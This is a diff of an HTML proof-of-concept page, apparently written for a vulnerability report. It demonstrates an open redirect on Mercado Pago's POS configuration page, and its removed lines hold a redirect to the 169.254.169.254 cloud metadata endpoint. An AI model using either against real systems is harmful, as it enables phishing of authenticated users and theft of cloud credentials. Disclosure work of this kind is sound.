@@ -1,27 +1,128 @@
 <!doctype html>
-<html>
-<head>
-<meta charset="utf-8">
+<html lang="en">
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <!-- Forces the full attacker URL to be exposed as document.referrer on the
+         target page, even on a cross-origin navigation. Required for the PoC. -->
+    <meta name="referrer" content="unsafe-url">
+    <title>Open-redirect PoC — Mercado Pago POS configuration</title>
+    <style>
+      :root {
+        --bg: #0f1220; --card: #171b2e; --line: #262c47; --ink: #e8ebf5;
+        --muted: #9aa3c4; --accent: #3483fa; --danger: #ff5a6a; --ok: #2fd07f;
+        --mono: ui-monospace, "SF Mono", Menlo, Consolas, monospace;
+      }
+      * { box-sizing: border-box; }
+      body {
+        margin: 0; min-height: 100vh; color: var(--ink);
+        font: 16px/1.6 system-ui, -apple-system, Segoe UI, Roboto, sans-serif;
+        background: radial-gradient(1200px 600px at 50% -10%, #1b2143 0%, var(--bg) 60%);
+        display: flex; align-items: center; justify-content: center; padding: 2.5rem 1rem;
+      }
+      .wrap { width: 100%; max-width: 620px; }
+      .pill {
+        display: inline-flex; align-items: center; gap: .5rem;
+        background: rgba(255,90,106,.12); color: var(--danger);
+        border: 1px solid rgba(255,90,106,.35); border-radius: 999px;
+        padding: .35rem .8rem; font-size: .82rem; font-weight: 600; letter-spacing: .2px;
+      }
+      .pill .dot { width: 8px; height: 8px; border-radius: 50%; background: var(--danger);
+        box-shadow: 0 0 0 4px rgba(255,90,106,.18); }
+      .card {
+        margin-top: 1rem; background: var(--card); border: 1px solid var(--line);
+        border-radius: 16px; padding: 1.6rem 1.6rem 1.4rem; box-shadow: 0 24px 60px rgba(0,0,0,.4);
+      }
+      h1 { font-size: 1.25rem; margin: .2rem 0 .3rem; line-height: 1.3; }
+      .sub { color: var(--muted); font-size: .92rem; margin: 0 0 1.3rem; }
+      code { font-family: var(--mono); background: rgba(255,255,255,.06); padding: .1rem .35rem; border-radius: 6px; font-size: .85em; }
+      label { display: block; font-size: .82rem; color: var(--muted); margin-bottom: .35rem; }
+      input {
+        width: 100%; padding: .7rem .85rem; border-radius: 10px; color: var(--ink);
+        background: #10132340; border: 1px solid var(--line); font: inherit; font-family: var(--mono);
+      }
+      input:focus { outline: none; border-color: var(--accent); }
+      .btn {
+        display: inline-block; margin-top: 1rem; width: 100%; text-align: center;
+        padding: .85rem 1rem; border-radius: 11px; background: var(--accent); color: #fff;
+        text-decoration: none; font-weight: 600; transition: filter .15s;
+      }
+      .btn:hover { filter: brightness(1.08); }
+      ol { margin: 1.4rem 0 0; padding-left: 1.2rem; color: var(--muted); font-size: .92rem; }
+      ol li { margin: .45rem 0; }
+      ol li strong { color: var(--ink); }
+      .landed {
+        margin-bottom: 1.1rem; border: 1px solid rgba(47,208,127,.4);
+        background: rgba(47,208,127,.1); border-radius: 12px; padding: 1rem 1.1rem;
+      }
+      .landed .t { color: var(--ok); font-weight: 700; display: flex; align-items: center; gap: .5rem; }
+      .landed .r { font-family: var(--mono); font-size: .82rem; color: var(--ink);
+        margin-top: .55rem; word-break: break-all; background: rgba(0,0,0,.25); padding: .55rem .7rem; border-radius: 8px; }
+      .foot { color: var(--muted); font-size: .78rem; margin-top: 1.1rem; text-align: center; }
+      .origin { font-family: var(--mono); }
+    </style>
+  </head>
+  <body>
+    <div class="wrap">
+      <span class="pill"><span class="dot"></span> Attacker-controlled origin · <span id="origin" class="origin"></span></span>
 
-<script>
-var u =
-    new URLSearchParams(location.search).get('u') ||
-    'http://169.254.169.254/latest/meta-data/';
+      <div class="card">
+        <div id="landing"></div>
 
-location.replace(u);
-</script>
+        <h1>Open redirect in Mercado Pago POS configuration</h1>
+        <p class="sub">After clicking <strong>Guardar</strong>, the page runs
+          <code>document.location = document.referrer</code> with no validation, so
+          it sends the authenticated user back to this attacker origin.</p>
 
-</head>
+        <label for="pos">Victim's own POS ID</label>
+        <input id="pos" inputmode="numeric" placeholder="135014700" value="135014700">
+        <a id="open" class="btn" href="#">Open Mercado Pago POS configuration →</a>
 
-<body>
+        <ol>
+          <li>Open this page while logged in to the Mercado Pago account that owns the POS.</li>
+          <li>Click the button — you land on the real
+            <code>www.mercadopago.com.ar</code> configuration page.</li>
+          <li>Click the pencil next to the POS name, type a character and delete it
+            (no data changes), then click <strong>Guardar</strong>.</li>
+          <li>Mercado Pago redirects the browser back to <strong>this origin</strong>.</li>
+        </ol>
+      </div>
+      <p class="foot">CWE-601 · document.referrer open redirect · CORE-015</p>
+    </div>
 
-<noscript>
-<meta
-    http-equiv="refresh"
-    content="0;url=http://169.254.169.254/latest/meta-data/">
-</noscript>
+    <script>
+      (function () {
+        var origin = window.location.origin;
+        document.getElementById('origin').textContent = origin;
 
-no-js
+        // Landing state: arrived here FROM mercadopago after Save.
+        if (document.referrer.indexOf('mercadopago.com.ar') !== -1) {
+          document.getElementById('landing').innerHTML =
+            '<div class="landed"><div class="t">✓ Redirect landed — Mercado Pago sent the ' +
+            'authenticated victim to the attacker origin after Save.</div>' +
+            '<div class="r">document.referrer = ' + document.referrer + '</div></div>';
+        }
 
-</body>
+        var params = new URLSearchParams(location.search);
+        var input = document.getElementById('pos');
+        var link = document.getElementById('open');
+        if (params.get('pos')) input.value = params.get('pos');
+        function update() {
+          var id = input.value.trim();
+          link.href = /^\d+$/.test(id)
+            ? 'https://www.mercadopago.com.ar/collections/setup/pos/' + id
+            : '#';
+        }
+        input.addEventListener('input', update);
+        link.addEventListener('click', function (e) {
+          update();
+          if (link.getAttribute('href') === '#') {
+            e.preventDefault();
+            alert('Enter the numeric ID of a POS owned by your test account.');
+          }
+        });
+        update();
+      })();
+    </script>
+  </body>
 </html>
